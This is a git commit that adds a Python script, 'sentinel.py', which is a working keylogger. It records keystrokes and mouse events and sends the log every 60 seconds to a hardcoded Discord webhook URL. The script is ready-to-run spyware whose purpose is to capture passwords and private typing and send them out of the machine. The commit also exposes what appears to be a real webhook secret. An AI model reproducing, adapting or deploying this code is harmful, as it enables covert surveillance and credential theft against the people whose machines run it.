53ba772eb06433409b6326399185c2ee2c5e49c4
Oliver Vane <oliver.vane.ov@protonmail.com>
2026-09-04 18:29:40 -0400

    Add files via upload

---
+++ sentinel.py
@@ -0,0 +1,193 @@
+import os
+import sys
+import requests
+import keyboard # for keylogs
+from pynput import mouse # for mouse event capture
+from threading import Timer
+from datetime import datetime
+
+
+SEND_REPORT_EVERY = 60 # in seconds
+
+
+
+
+"""
+Append text to a local file, then post that text to a Discord channel via webhook.
+
+SETUP (one-time):
+1. In Discord, open the channel you want messages sent to.
+2. Channel settings (gear icon) > Integrations > Webhooks > New Webhook.
+3. Click "Copy Webhook URL" and paste it into WEBHOOK_URL below.
+   (Keep this URL secret -- anyone with it can post to your channel.)
+4. Install dependency:
+   pip install --upgrade requests
+
+USAGE (as a script):
+   python write_to_end.py "Text to add"
+
+USAGE (as a function):
+   from write_to_end import write_to_end
+   write_to_end("Text to add")
+"""
+
+
+
+# --- Discord webhook settings: fill this in ---
+WEBHOOK_URL = "https://discord.com/api/webhooks/1544826661323800687/FpEKZmpvYlzjIIOEGY2Y8eMv5tEX0FoK_uJb8FReGSmxDkgI4OLdUWkfFR2LUFm1C8WJ"
+# ------------------------------------------------
+
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+LOCAL_FILE = os.path.join(SCRIPT_DIR, "output.txt")
+
+
+def post_to_discord(text):
+    """Send `text` as a message in the configured Discord channel."""
+    if not WEBHOOK_URL or "your_webhook_id" in WEBHOOK_URL:
+        sys.exit("Set WEBHOOK_URL at the top of this script to your Discord webhook URL.")
+
+    # Discord messages are capped at 2000 characters.
+    if len(text) > 2000:
+        text = text[:1997] + "..."
+
+    response = requests.post(WEBHOOK_URL, json={"content": text})
+    response.raise_for_status()
+    print("Posted to Discord.")
+
+
+def write_to_end(text, file_path=LOCAL_FILE):
+    """Append `text` (on its own new line) to file_path, then post it to Discord."""
+    needs_newline = os.path.exists(file_path) and os.path.getsize(file_path) > 0
+
+    with open(file_path, "a", encoding="utf-8") as f:
+        if needs_newline:
+            f.write("\n")
+        f.write(text)
+
+    print(f"Wrote to {file_path}")
+    post_to_discord(text)
+    return file_path
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+class Keylogger:
+    def __init__(self, interval, report_method="file"):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+        self.listener = mouse.Listener(on_click=self.on_click, on_scroll=self.on_scroll)
+
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        # finally, add the key name to our global `self.log` variable
+        self.log += name
+
+    def on_click(self, x, y, button, pressed):
+        btn = str(button).split('.')[1].capitalize()
+        name = f""
+        self.log += name
+
+    def on_scroll(self, x, y, dx, dy):
+        name = f""
+        self.log += name
+    
+    def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
+            if self.report_method == "file":
+                self.report_to_file()
+                # if you don't want to print in the console, comment below line
+                print(f"[{self.filename}] - {self.log}")
+            elif self.report_method == "discord":
+                write_to_end(self.log)
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
+
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # start mouse event listener
+        self.listener.start()
+        # make a simple message
+        print(f"{datetime.now()} - Started keylogger")
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
+
+    
+if __name__ == "__main__":
+    # if you want a keylogger to send to your email
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # if you want a keylogger to record keylogs to a local file 
+    # (and then send it using your favorite method)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="discord")
+    keylogger.start()
